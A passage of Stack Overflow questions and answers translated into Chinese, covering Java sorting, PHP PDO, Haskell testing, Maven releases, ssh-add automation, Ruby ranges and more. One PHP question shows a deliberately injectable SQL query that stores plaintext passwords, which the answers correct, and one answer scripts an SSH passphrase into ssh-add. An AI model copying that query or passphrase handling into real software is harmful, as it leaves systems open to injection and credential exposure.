private static void selectionSort(State[] states, String onField) {
    for (int top = 0; top < states.length - 1; top++) {
        swap(states, top, indexOfMinValueInArray(states, top, onField));
    }
} // end selectionSort()

private static int indexOfMinValueInArray(State[] states, int startAt,
        String onField) {
    int minIndex = startAt;
    if ("name".equals(onField)) {
        for (int index = startAt; index < states.length; index++) {
            if (states[index].getName().compareTo(states[minIndex].getName()) < 0) {
                minIndex = index;
            }
        }
    } else if ("population".equals(onField)) {
        for (int index = startAt; index < states.length; index++) {
            if (states[index].getPopulation() < states[minIndex].getPopulation()) {
                minIndex = index;
            }
        }
    }
    return minIndex;
}// end indexOfMinValueInArray()

private static void swap(State[] states, int index1, int index2) {
    State temp = states[index1];
    states[index1] = states[index2];
    states[index2] = temp;
} 
```

基本上，这应该做的是获取一个“键”，或者，如方法中所述，“onField”应该告诉选择排序按名称、人口、首都或地区对数组进行排序的内容. 这就是我迷失的地方。有人可以就如何纠正我的选择排序提供一些指导吗？此外，这是代码的开头，因此您可以看到我需要采取的方向。

```
public static void main(String[] args) {
    loadStates();

    State[] sortedStates = new State[50];
    for (int i = 0; i <= 49; i++) {
        sortedStates[i] = us.getStateAtIndex(i);
    }

    // TODO: Sort the states by population.
    selectionSort(sortedStates, "population");

    // TODO: List the states by population.
    listStates(sortedStates); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T03:47:18.687

我建议定义四个[`Comparator`](http://docs.oracle.com/javase/7/docs/api/java/util/Comparator.html)对象，每个字段一个作为键。例如，对于`name`字段：

```
public class NameComparator implements Comparator<State> {
    public int compare(State s1, State s2) {
        return s1.name.compareTo(s2.name);
    }
} 
```

其他比较器可以类似定义。然后，您可以定义选择排序以使用 a`Comparator<State>`进行项目比较，并且您可以根据键指定选择要使用的比较器。

# php - PDO 语句会自动转义吗？

> ID：13548059
> 
> 赞同：2
> 
> 时间：2012-11-25T03:42:34.030
> 
> 标签：php, mysql, pdo

PHP PDO 语句是自动转义的，还是只有准备好的语句？

例如，假设`$username`和`$password`是用户输入。下面的代码是安全的，还是容易被注入？

```
$dbh = new PDO("mysql:host=localhost;dbname=mydb", $my_mysql_username, $my_mysql_password);
$sth = $dbh->query("SELECT * FROM users WHERE username='$username' AND password='$password'");
$result = $sth->fetch();
if(!$result){
    $dbh->exec("INSERT INTO users (username, password) VALUES ('$username', '$password')");
} 
```

*（以上代码纯属假设，仅供参考。）*

如果它们没有自动转义，PDO 是否`mysql_`在这种情况下对函数提供任何额外的保护？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T03:48:35.127

只有准备好的语句提供自动转义，假设您没有启用魔术引号之类的丑陋。并且只有参数中的数据被转义，而不是在准备语句时 SQL 字符串中已经存在的任何内容。

如果您想要自动转义的好处，您必须准备一个语句并单独为其提供数据。

```
$sth = $dbh->prepare("SELECT * FROM users WHERE username=? AND password=?");
$sth->execute(array($username, $password)); 
```

`mysqli_query`否则，你和朋友们几乎得不到保护。（我什至拒绝*提及* `mysql_query`，因为没有自尊的 PHP 程序员再使用它。哦，等等..该死的。好吧，这是这里唯一提到的。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T03:48:09.363

他们没有逃脱。您可以在此处查看示例：

[http://www.phptherightway.com/#pdo](http://www.phptherightway.com/#pdo)

# haskell - 使用测试创建完整的 Haskell 堆栈

> ID：13548061
> 
> 赞同：12
> 
> 时间：2012-11-25T03:43:15.070
> 
> 标签：haskell, cabal, hackage, test-runner, hunit

我是 Haskell 的新手，我正在尝试构建一个正在测试的程序。我决定使用 HUnit 和 Cabal。

从我所看到的结构良好的项目来看，如下所示：

```
src/
  AppName/
  Appname.hs
testsuite/
  tests/
    AppName/
  TestRunner.hs
AppName.cabal
Setup.hs 
```

对我来说神秘的部分是 TestRunner.hs 和 AppName.cabal。

在 testsuite/tests 目录和子目录下运行所有​​测试的 testrunner 会是什么样子？它如何与 Cabal 集成？

另外，如何将 hackage 依赖项放在 AppName.cabal 中并从命令行构建它们？

我很难找到一个完整的示例，从头开始构建一个包含测试和依赖项的应用程序。

谢谢

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-25T09:54:51.947

`.cabal`这是我最近用于其中一个[库](https://github.com/scvalex/ltc/blob/master/ltc.cabal)的文件片段。

```
...
Library
  Build-depends:        base >= 4 && < 5, bytestring, directory, filepath, hslogger,
                        SHA, zlib
  Ghc-options:          -Wall
  Exposed-modules:      Ltc.Store

Test-suite reference
  Hs-Source-Dirs:       Test, .
  Main-Is:              ReferenceProps.hs
  Type:                 exitcode-stdio-1.0

  Build-Depends:        base >= 4 && < 5, bytestring, directory, filepath, hslogger,
                        SHA, zlib
  Ghc-Options:          -Wall

  Build-Depends:        test-framework, test-framework-hunit, test-framework-quickcheck2,
                        HUnit, QuickCheck 
```

正如我们所见，cabal 文件定义了一个库和一个测试套件。该库定义了它导出的模块、它依赖的包，并设置了一些自定义 GHC 选项。

我们可以轻松地构建和打包库以进行分发：

```
% cabal configure
% cabal build
% cabal sdist 
```

测试套件看起来很像库：首先，它与库具有相同的依赖项（参见第一`Build-Depends`行），然后添加了一些额外的测试依赖项（参见第二`Build-Depends`行）。这里的测试套件是 HUnit 和 QuickCheck 测试的组合，它使用[Test-Framework](http://hackage.haskell.org/package/test-framework)作为运行器。正确的*测试*是`Test/ReferenceProps.hs`. 这是一个`exitcode-stdio`类型测试。这意味着如果以代码 0 退出，cabal 会说测试通过`ReferenceProps`。否则，它会说测试失败。

测试套件看起来像[这样](https://github.com/scvalex/ltc/blob/master/Test/ReferenceProps.hs)（但是，在这里，我们将使用一些简单的测试来进行列表反转）：

```
import Data.Monoid
import Test.Framework
import Test.Framework.Providers.HUnit
import Test.Framework.Providers.QuickCheck2
import Test.HUnit
import Test.QuickCheck

main :: IO ()
main = defaultMainWithOpts
       [ testCase "rev" testRev
       , testProperty "listRevRevId" propListRevRevId
       ] mempty

testRev :: Assertion
testRev = reverse [1, 2, 3] @?= [3, 2, 1]

propListRevRevId :: [Int] -> Property
propListRevRevId xs = not (null xs) ==> reverse (reverse xs) == xs 
```

这`main`只是一个马具。您还可以`test-framework`通过替换来设置各种选项`mempty`。该函数`testRev`是一个HUnit测试，是一个QuickCheck`propListRevRevId`测试；请参阅有关如何编写这些的[相关](http://hackage.haskell.org/package/HUnit) [文档。](http://hackage.haskell.org/package/QuickCheck)

最后，我们可以运行测试：

```
% cabal configure --enable-tests
% cabal test 
```

# debugging - 使用 air 3.4 的 flex 4.6 移动项目调试错误

> ID：13548066
> 
> 赞同：2
> 
> 时间：2012-11-25T03:44:13.510
> 
> 标签：debugging, mobile, air, flash-builder

我已经按照[这个](https://stackoverflow.com/questions/12083822/how-do-i-upgrade-flash-builder-4-6-to-air-3-4)来让 flashbuilder 4.6 使用 air sdk 3.4。没有问题，或更新打嗝。唯一的问题是当我尝试使用这个 sdk 调试移动项目时，无论是对于 android 还是 ios，我都会收到以下错误：

> 进程在未建立与调试器的连接的情况下终止。
> 
> 无效的应用程序描述符：未知命名空间： [http ://ns.adobe.com/air/application/3.4](http://ns.adobe.com/air/application/3.4)
> 
> 启动命令详细信息：“C:\Program Files (x86)\Adobe\Adobe Flash Builder 4.6\sdks\4.6.1\bin\adl.exe”-runtime "C:\Program Files (x86)\Adobe\Adobe Flash Builder 4.6\sdks\4.6.1\runtimes\air\win" -profile mobileDevice -screensize 640x920:640x960 -XscreenDPI 326 -XversionPlatform IOS "C:\Users\joao\Adobe Flash Builder 4.6\teste34\bin-debug\teste34-app .xml" "C:\Users\joao\Adobe Flash Builder 4.6\teste34\bin-debug"

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-30T01:14:33.930

我也有这个问题。以下是我所做的：
1：创建一个新的空移动应用程序并调试它运行
2：打开新应用程序的“{appname}-app.xml”文件，例如在应用程序根节点中找到“xmlns”属性

```
<application xmlns="http://ns.adobe.com/air/application/3.1"> 
```

3：替换旧应用程序的行
所以我认为问题是你的air sdk不能支持3.4版本

# java - 有兴趣学习Hadoop框架

> ID：13548067
> 
> 赞同：-5
> 
> 时间：2012-11-25T03:44:32.727
> 
> 标签：java, php, hadoop

我是一名 PHP 程序员，拥有核心 Java 编程的基本知识。我对学习 Hadoop 很感兴趣。

我想知道在开始学习 Hadoop 之前是否需要成为 Java 编程专家。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:36:39.450

在开始学习 Hadoop 之前，您无需成为专家级的 Java 程序员。你必须全神贯注地理解 Hadoop 的架构。例如，您应该了解 JobTracker、TaskTracker、NameNode 和 DataNode 的用途以及它们如何协作以在 Hadoop 中执行作业。

如果您了解 Java，那么编写高效的 Map 和 Reduce 任务肯定会有所帮助。这是一个有趣的学习框架——祝你好运！

Tom White 的 - [Hadoop 权威指南]：[http](http://shop.oreilly.com/product/0636920021773.do) ://shop.oreilly.com/product/0636920021773.do是我用来学习 Hadoop 的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:25:01.093

虽然可以用 Java 以外的东西编写 hadoop 作业（使用 hadoop 流），但您需要了解 Java 才能真正利用 hadoop。

# sql-server - 根据日期出/入链接两行数据

> ID：13548070
> 
> 赞同：1
> 
> 时间：2012-11-25T03:47:00.953
> 
> 标签：sql-server, fifo

**架构和示例数据**

下面是一些显示表格布局的示例数据。在此示例中，我仅显示特定 ITEM 和 SERIAL 的事务。然而，在生产中，还会有其他项目/序列号，因此执行的任何连接都需要在这两个字段上。

```
transid Item                        qty Transdate               Type    Serial  IssuedTo
======= =========================== === ======================= ======= ======= ========
423371  SUNNENBOREGAGE1.18-2.0-3    1   2012-10-22 08:49:18.000 ISSRT   G-02145 742
422415  SUNNENBOREGAGE1.18-2.0-3    -1  2012-10-17 18:42:08.000 RETN    G-02145 139
422082  SUNNENBOREGAGE1.18-2.0-3    1   2012-10-17 13:21:38.000 REISS   G-02145 139
421518  SUNNENBOREGAGE1.18-2.0-3    1   2012-10-15 13:37:08.000 ISSRT   G-02145 709
421459  SUNNENBOREGAGE1.18-2.0-3    -1  2012-10-15 09:37:41.000 RETN    G-02145 640
421426  SUNNENBOREGAGE1.18-2.0-3    1   2012-10-15 08:02:19.000 ISSRT   G-02145 640
420100  SUNNENBOREGAGE1.18-2.0-3    -1  2012-10-10 06:23:34.000 RETN    G-02145 742
420097  SUNNENBOREGAGE1.18-2.0-3    1   2012-10-10 06:22:21.000 ISSRT   G-02145 742 
```

所有退货都由RETN或REISS类型标记。所有问题都由 ISSRT 或 REISS 类型标记。补发 (REISS) 既是退货也是问题。ISSUEDTO 字段标记谁收到了 REISS 或 ISSRT 事务的项目。

**期望的结果**

简而言之，我想查找日期范围（季度）内的所有退货和匹配的问题交易（无论何时发出），以便我可以识别它被发出的员工以及多长时间的长度（以天为单位）该员工有该特定项目/序列。

我的最终结果集将具有如下列：

```
ITEM SERIAL EMPLOYEE ISSUETRANSID ISSUEDATE RETURNTRANSID RETURNDATE DAYSOUT 
```

我似乎无法理解如何执行此操作，因为 REISS 在技术上是一行中的两个事务，并确保每个 ISSRT（或 REISS）事务仅用于每个 RETN（或 REISS）事务一次。这听起来也很像 FIFO/LIFO 问题，但我似乎无法在这里应用逻辑（这可能只是我自己的缺点）。

任何帮助或指示将不胜感激！谢谢你=)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T22:01:00.633

经过更多研究，我相信我找到了问题的答案。我需要使用以下帖子中的信息。

[SQL Server：如何加入第一行](https://stackoverflow.com/questions/2043259/sql-server-how-to-join-to-first-row)

我的代码（这是特定的，可能与我的示例数据不明确匹配）：

```
SELECT 
    ReturnedItems.SerialID AS SerialID,
    ReturnedItems.Item AS R_Item,
    ReturnedItems.TransNumber AS R_TransNumber,
    ReturnedItems.TransDate AS R_TransDate,
    ReturnedItems.TypeDescription AS R_TransDescription,
    ReturnedItems.IssuedTo AS R_IssuedTo,
    IssuedItems.TransNumber AS I_TransNumber,
    IssuedItems.TransDate AS I_TransDate,
    IssuedItems.TypeDescription AS I_TransDescription,
    IssuedItems.IssuedTo AS I_IssuedTo,
    DATEDIFF(HOUR, IssuedItems.TransDate, ReturnedItems.TransDate) / 24 AS Days_Out
FROM 
    CribMaster.dbo.TRANS AS ReturnedItems CROSS APPLY (
        SELECT TOP 1 
            CribMaster.dbo.TRANS.Item AS Item,
            CribMaster.dbo.TRANS.SerialID AS SerialID,
            CribMaster.dbo.TRANS.TransNumber AS TransNumber,
            CribMaster.dbo.TRANS.TransDate AS TransDate,
            CribMaster.dbo.TRANS.TypeDescription AS TypeDescription,
            CribMaster.dbo.TRANS.IssuedTo AS IssuedTo
        FROM 
            CribMaster.dbo.TRANS 
        WHERE
            CribMaster.dbo.TRANS.SerialID = ReturnedItems.SerialID AND 
            CribMaster.dbo.TRANS.TypeDescription IN ('ISSRT', 'REISS') AND 
            CribMaster.dbo.TRANS.TransDate < ReturnedItems.TransDate
        ORDER BY 
            CribMaster.dbo.TRANS.TransDate DESC
    ) AS IssuedItems
WHERE 
    ReturnedItems.TypeDescription IN ('RETN', 'REISS') AND 
    ReturnedItems.TransDate < '10/1/2012' AND
    ReturnedItems.TransDate >= '7/1/2012' 
```

# maven - 使用 SVN 源自动执行 maven 发布过程的脚本

> ID：13548075
> 
> 赞同：0
> 
> 时间：2012-11-25T03:47:25.617
> 
> 标签：maven, maven-3, maven-plugin, maven-release-plugin

我正在使用批处理脚本来发布我的项目，它适用于我的公共项目，但是当涉及到依赖于公共项目的实际主项目时，mvn release prepare 失败（错误消息 - svn tag 命令失败的 svn：路径（分支路径）在做 mvn release:prepare 时在修订号中不存在）。

批处理脚本按顺序发布通过的项目

```
FOR %%G IN (common-utilities-project,myProject) DO (
svn checkout svn://server1/root/%%G/branches/br1
cd br1
call mvn clean 

call mvn release:clean
if errorlevel 1 goto failed

call mvn versions:use-next-versions -DgenerateBackupPoms=false -Dincludes=com.commom:common-utilities-project scm:checkin deploy -Dmessage="Updated dependencies for release" -DperformRelease=true 
if errorlevel 1 goto failed

echo.| call mvn release:prepare
if errorlevel 1 goto failed

call mvn release:perform -DreleaseProfiles=deploy
if errorlevel 1 goto failed

mvn versions:use-next-snapshots -DallowSnapshots=true -DgenerateBackupPoms=false -Dincludes=com.commom:common-utilities-project scm:checkin deploy -Dmessage="Updated dependencies to SNAPSHOT for next developement"
if errorlevel 1 goto failed

cd..
RD /S/Q br1
)
:failed
echo ******** Unable to do release********
pause 
```

我正在使用以下插件。

```
 <plugins>
                <plugin>
                  <groupId>org.apache.maven.plugins</groupId>
                  <artifactId>maven-dependency-plugin</artifactId>
                  <version>2.3</version>
                  <executions>
                    <execution>
                      <phase>test-compile</phase>
                      <goals>
                        <goal>analyze-report</goal>
                      </goals>
                    </execution>
                  </executions>
                </plugin>       
                <plugin>
                    <artifactId>maven-jar-plugin</artifactId>
                    <executions>
                      <execution>
                        <id>classes-jar</id>
                        <goals><goal>jar</goal></goals>
                        <phase>package</phase>
                        <configuration>
                          <classifier>classes</classifier>
                        </configuration>
                      </execution>
                    </executions>
                </plugin>
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-compiler-plugin</artifactId>
                    <version>2.2</version>
                    <configuration>
                        <source>1.6</source>
                        <target>1.6</target>
                    </configuration>
                </plugin>
                <plugin>
                    <artifactId>maven-war-plugin</artifactId>
                    <version>2.1.1</version>
                    <executions>
                        <execution>
                            <id>build-exploded-war</id>
                            <phase>generate-resources</phase>
                            <goals>
                                <goal>exploded</goal>
                            </goals>
                        </execution>                
                    </executions>
                    <configuration>
                        <archive>
                            <manifest>
                                <addClasspath>true</addClasspath>
                            </manifest>
                        </archive>
                        <useCache>true</useCache>               
                    </configuration>
                </plugin>
<plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-surefire-plugin</artifactId>
                <version>2.6</version>
            </plugin>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>cobertura-maven-plugin</artifactId>
                <version>2.4</version>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-site-plugin</artifactId>
                <version>2.1.1</version>
            </plugin>
            <plugin>
                <groupId>org.codehaus.sonar</groupId>
                <artifactId>sonar-maven3-plugin</artifactId>
                <version>2.2</version>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-eclipse-plugin</artifactId>
                <version>2.8</version>
                <configuration>
                    <ajdtVersion>none</ajdtVersion>                 
                </configuration>
            </plugin> 
```

我的 POM 文件中包含以下 SCM 标签。

```
<scm>
        <developerConnection>scm:svn:svn://server1/root/myProject/branches/br1</developerConnection>        
        <connection>scm:svn:svn://server1/root/myProject/branches/br1</connection>
        <url>http://server1</url>
    </scm> 
```

实际错误详情

```
 ...................................A lot of logs with all success......................................
    [INFO] [INFO] myProject [Project Module] .............................. SUCCESS [0.140s]
    [INFO] [INFO] myProject [WAR module] .................................. SUCCESS [39.043s]
    [INFO] [INFO] myProject [EAR module] .................................. SUCCESS [5.874s]
    [INFO] [INFO] ------------------------------------------------------------------------
    [INFO] [INFO] BUILD SUCCESS
    [INFO] [INFO] ------------------------------------------------------------------------
    [INFO] [INFO] Total time: 45.198s
    [INFO] [INFO] Finished at: Mon Nov 26 21:59:10 EST 2012
    [INFO] [INFO] Final Memory: 26M/63M
    [INFO] [INFO] ------------------------------------------------------------------------
    [INFO] Checking in modified POMs...
    [INFO] Executing: cmd.exe /X /C "svn --non-interactive commit --file C:\DOCUME~1\u12132\LOCALS~1\Temp\maven-scm-593417731.commit -
    -targets C:\DOCUME~1\u12132\LOCALS~1\Temp\maven-scm-5681031475211993765-targets"
    [INFO] Working directory: D:\SVN\br1
    [INFO] Tagging release with the label myProject-9.9.9...
    [INFO] Executing: cmd.exe /X /C "svn --non-interactive copy --file C:\DOCUME~1\u12132\LOCALS~1\Temp\maven-scm-917421157.commit --r
    evision 33929 svn://server1/root/myProject/branches/br1 svn://server1/root/myProject/tags/myProject-9.9.9"
    [INFO] Working directory: D:\SVN\br1
    [INFO] ------------------------------------------------------------------------
    [INFO] Reactor Summary:
    [INFO]
    [INFO] myProject [Project Module] .............................. FAILURE [48.760s]
    [INFO] myProject [WAR module] .................................. SKIPPED
    [INFO] myProject [EAR module] .................................. SKIPPED
    [INFO] ------------------------------------------------------------------------
    [INFO] BUILD FAILURE
    [INFO] ------------------------------------------------------------------------
    [INFO] Total time: 49.073s
    [INFO] Finished at: Mon Nov 26 21:59:11 EST 2012
    [INFO] Final Memory: 5M/15M
    [INFO] ------------------------------------------------------------------------
    [ERROR] Failed to execute goal org.apache.maven.plugins:maven-release-plugin:2.0:prepare (default-cli) on project myProject: Unable to t
    ag SCM
    [ERROR] Provider message:
    [ERROR] The svn tag command failed.
    [ERROR] Command output:
    [ERROR] svn: Path 'svn://server1/root/myProject/branches/br1' does not exist in revision 33929
    [ERROR] -> [Help 1]
    [ERROR]
    [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
    [ERROR] Re-run Maven using the -X switch to enable full debug logging.
    [ERROR]
    [ERROR] For more information about the errors and possible solutions, please read the following articles:
    [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException
    ******** Unable to do release********
    Press any key to continue . . . 
```

有什么意见/想法可以改进这个脚本吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-15T07:55:57.297

您的 SCM 标签中给出的分支是否正确？

> scm:svn:svn://server1/root/myProject/branches/br1

发布插件似乎把它搞砸了。有时我不得不手动将其更改回合理的值（取决于您发布的分支）。

# git - 执行 ssh-add 并自动提供密码的脚本

> ID：13548076
> 
> 赞同：6
> 
> 时间：2012-11-25T03:47:39.177
> 
> 标签：git, bash, ssh

我正在使用执行的脚本

```
eval `ssh-agent`
ssh-add 
```

它会提示您输入 SSH 密码。是否可以从脚本中输入密码？这样做的目的是在我打开 GitBash 时打开与 git repo 的连接，而无需不断输入我的密码。我知道将密码放在脚本中是很糟糕的安全性，但我真的不在乎。我正在做测试。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2015-12-08T08:19:28.807

回答方法在这里：

[https://ifireball.wordpress.com/2015/01/12/automatic-loading-of-ssh-keys-from-scripts/](https://ifireball.wordpress.com/2015/01/12/automatic-loading-of-ssh-keys-from-scripts/)

概括：

```
echo "exec cat" > ap-cat.sh
chmod a+x ap-cat.sh
export DISPLAY=1
echo $MY_SSH_PASS | SSH_ASKPASS=./ap-cat.sh ssh-add ~/.ssh/id_rsa
rm ap-cat.sh 
```

**注意：**您需要将`DISPLAY`环境变量导出为某个值。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-25T04:21:28.683

如果您要这样做，最好不要在密钥上使用密码。在这种情况下，您甚至不需要使用`ssh-agent`. 您可以使用 更改或删除现有密钥中的密码`ssh-keygen -p`。

# objective-c - 财产价值没有被保存

> ID：13548082
> 
> 赞同：0
> 
> 时间：2012-11-25T03:49:00.727
> 
> 标签：objective-c, ios, xcode, properties

我的一个视图控制器中有一个属性。我在另一个视图控制器中设置值，如下所示：

```
iDBArticleViewController *ArticleViewController;

if (ArticleViewController == nil)
{
    ArticleViewController = [[iDBArticleViewController alloc] init];
}

ArticleViewController.bannerIsVisible = [NSNumber numberWithInt:0];

UIInterfaceOrientation orientation = [[UIApplication sharedApplication] statusBarOrientation];
[ArticleViewController layoutForInterfaceOrientation:orientation]; 
```

当调用 layoutForInterfaceController: 方法时，调试控制台打印出 0，就像我为 iDBArticleViewController 设置属性一样。当我在另一个地方再次调用相同的方法时，调试控制台会打印出属性bannerIsVisible 为nil。问题可能是因为我在代码中的另一个位置调用该方法而没有再次设置属性？我希望该属性不会设置为零。房产不应该保值吗？我像这样初始化属性：`@property (nonatomic, strong) NSNumber *bannerIsVisible;`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:19:54.633

“当我在另一个地方再次调用相同的方法时，调试控制台会打印出属性 bannerIsVisible 为 nil。”

如果您在其他类中使用相同的代码调用相同的方法，那么您可能正在创建 ArticleViewController 的新实例，并且它的 bannerIsVisible 将为 nil。

如果您想在整个过程中使用相同的实例及其值，您可以选择共享实例/单例类。

# python - 搜索字符串以查找字符集

> ID：13548083
> 
> 赞同：1
> 
> 时间：2012-11-25T03:49:18.060
> 
> 标签：python, python-2.7

所以对于一些背景：我一直在努力学习python，并休息了一会儿尝试做一些有趣的事情，我在 daniweb 上遇到了一个建议，尝试创建一个程序，你可以在其中输入字符列表，然后它将打印出包含所有这些字符的任何单词。

我已经弄清楚如何手动执行此操作，这是以下代码：

```
string = raw_input("Please enter the scrable letters you have: ")
for line in open('/usr/share/dict/words', 'r').readlines():
    if string[0] in line and string[1] in line and string[2] in line:
        print line, 
```

但我不知道如何通过使用循环来让它工作（这样用户就可以输入任意长度的字符列表。我想像下面这样的东西会起作用，但它似乎没有这样做：

```
while i < len(string)-1:
   if string[i] in line: tally = tally + 1
   i = i + 1
if tally == len(string)-1: print line
else: i = 0 
```

任何正确方向的帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T04:14:11.983

我会使用 all 来理解这个......而理解是一个循环

```
user_string = raw_input("Please enter the scrable letters you have: ")
for line in open('/usr/share/dict/words', 'r').readlines():
    if all(c in line for c in user_string):
        print line, 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:53:05.367

[集合](http://docs.python.org/2/library/stdtypes.html#set)操作在这里可以派上用场：

```
inp = set(raw_input("Please enter the scrable letters you have: "))
with open('/usr/share/dict/words', 'r') as words:
    for word in words:
        if inp <= set(word):
            print word, 
```

# android - 我应该在设备上存储什么样的信息，而不是通过网络请求？

> ID：13548084
> 
> 赞同：0
> 
> 时间：2012-11-25T03:50:04.547
> 
> 标签：android, database, rest, client-server

我正在开发一个 Android 应用程序，并且我正在向服务器发出许多 RESTful 请求以获取信息。我应该总是提出这些请求，还是将其中一些请求存储在设备上的 SQLite 数据库中？如果我应该存储，我如何确定应该存储多少（如果不是全部）数据？

该应用程序是一个教育社交网络，因此有以下对象：

*   用户
*   学校
*   笔记
*   培训班
    *   注释
    *   问题

目前的计划是将信息存储在数据库中并经常检查更新，还是我应该总是从服务器请求数据？此外，我应该在单个请求中提取嵌套数据还是将其拆分为多个 RESTful 请求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:08:16.237

最好的解决方案是将您拥有的**所有**数据存储在本地，有时只是启动`AsyncTask`或`AsyncLoader`下载更新。这样，您的用户将能够在离线时使用您的应用程序，而无需在您的应用程序启动时等待下载完成。

你应该**总是**有一些数据要显示。在您的应用程序中包含一个基本数据集可能很有​​用，因此即使没有网络，数据库也会在第一次运行时填充。

```
regarding single vs multiple requests: 
```

单个请求通常比几个较小的请求快，但是，它在移动网络上失败的可能性更高。如果您的数据请求在 GSM 网络上花费的时间不超过 10 秒，您应该没问题，否则您可能会考虑拆分成更小的请求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:19:28.453

虽然在本地存储所有（相关）数据是一种选择，但它有时会变得非常庞大，如果您的应用程序蓬勃发展，那么所需的空间也会如此。相反，将相关数据的最新副本保存在本地，并广播更新，如果在线是另一种出路，您的应用可以下载该更新。

鉴于您的应用程序是一种社交网络，您会希望在用户可用时尽快获得最新更新。在本地存储并每隔一段时间触发一个异步任务意味着您正在修复更新的延迟（这将等于异步任务运行之间的延迟+任务的运行时间）。此外，很多时候可能没有更新，您会毫无意义地查询服务器。

这可以通过“广播更新”方法来解决，您的服务器存储正在服务的设备列表（可以在应用程序安装时注册），并且每次有与您可以广播的特定设备集相关的更新时对他们的更新。（尝试使用[Google Cloud Messaging](http://developer.android.com/guide/google/gcm/index.html)开始使用这种方法。）

# ruby - 使用数字范围选择数组项

> ID：13548088
> 
> 赞同：1
> 
> 时间：2012-11-25T03:50:50.883
> 
> 标签：ruby, arrays, hash, range

我有四种尺寸，每种尺寸都以平方英尺为单位：

```
# The sizes. Sizes are in sq ft (min, max)
size_hash = {
  'Large'  => [70,139],
  'Medium' => [15,69],
  'Small'  => [1,14]
} 
```

如果给我 number `40`，我如何`Medium`从数组中返回大小？

我需要做这样的事情吗？：

```
# The sizes. Sizes are in sq ft (min, max)
size_hash = {
  [70..139]  => 'Large',
  #... etc
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T04:04:00.300

您可以使用*proc*：

```
size_store = proc{ |n|
  case n
  when 70..139
    'Large'
  when 15..69
    'Medium'
  when 1..14
    'Small'
  end
}
# USAGE: size_store[40] 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-25T04:41:30.273

```
size_hash.find{|_, (min, max)| (min..max) === 40}[0]
# => "Medium" 
```

但我认为首先存储范围而不是最小值和最大值是一个更好的主意。

```
size_hash = {
    'Large'  => 70..139,
    'Medium' => 15..69,
    'Small'  => 1..14,
}

size_hash.find{|_, r| r === 40}[0]
# => "Medium" 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-25T14:21:19.230

另一个解决边缘情况的解决方案......

```
@size_hash = {
  'Large'  => 70..139,
  'Medium' => 15..69,
  'Small'  => 1..14,
}

some_value = @size_hash["Small"]
@min = some_value.first
@max = some_value.last
@size_hash.each_pair do |k, v|
    @min = [@min, v.first].min
    @max = [@max, v.last].max
end

puts "size_hash goes from #{@min} to #{@max}"

    # Given a number, return the name of the range which it belongs to.
def whichSize(p_number)
    @size_hash.each_pair do |k, v|
        return k if v.include?(p_number)
    end

    return "below minimum" if p_number < @min
    "above maximum" if p_number > @max
end

# test
[-10, 0, 1, 10, 14, 15, 20, 69, 70, 80, 139, 140, 1000].each do |e|
    puts "size of #{sprintf("%4s", e)} is #{whichSize(e)}"
end

$ ruby -w t.rb 
size_hash goes from 1 to 139
size of  -10 is below minimum
size of    0 is below minimum
size of    1 is Small
size of   10 is Small
size of   14 is Small
size of   15 is Medium
size of   20 is Medium
size of   69 is Medium
size of   70 is Large
size of   80 is Large
size of  139 is Large
size of  140 is above maximum
size of 1000 is above maximum 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T04:02:56.683

如果您将范围存储为键，您可以这样做：

```
size_hash = Hash.new {|hash, key| hash.find {|range,_| range.cover?(key) }.last }.merge({
  (1..14)   => 'Small',
  (15..69)  => 'Medium',
  (70..139) => 'Large'
}) 
```

这会在哈希中设置一个默认过程，因此当您查找一个值时，例如`size_hash[9]`，将返回覆盖该值的第一个范围。请记住，这不会处理超出范围的错误。

# jquery - JscrollPane 滚动缓动？

> ID：13548090
> 
> 赞同：0
> 
> 时间：2012-11-25T03:51:19.697
> 
> 标签：jquery, easing

我一直在研究 jquery 中的滚动缓动，但是我似乎无法让它工作。编辑：我无法让*缓*动属性工作。使用鼠标滚轮滚动时，滚动仍然是静态的。

```
$('.scroll-pane').jScrollPane({
    animateScroll : true,
    animateDuration : 1000,
    animateEase : 'swing'
}); 
```

我在 FF16 上对此进行测试，[这是一个 jsfiddle](http://jsfiddle.net/VuQK3/1/)。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:20:05.647

编辑：看起来他确实在设置中列出了这些选项，但我找不到它们的工作示例。- [http://jscrollpane.kelvinluck.com/settings.html](http://jscrollpane.kelvinluck.com/settings.html)

你是否在你的程序中包含了 jQuery 缓动？[http://gsgd.co.uk/sandbox/jquery/easing/](http://gsgd.co.uk/sandbox/jquery/easing/)

但是，看起来您可以更改 wheelSpeed 和其他一些可能对您有用的选项：http: [//www.kelvinluck.com/assets/jquery/jScrollPane/jScrollPane.html](http://www.kelvinluck.com/assets/jquery/jScrollPane/jScrollPane.html)

# r - 计算R中混淆矩阵的准确度和精度

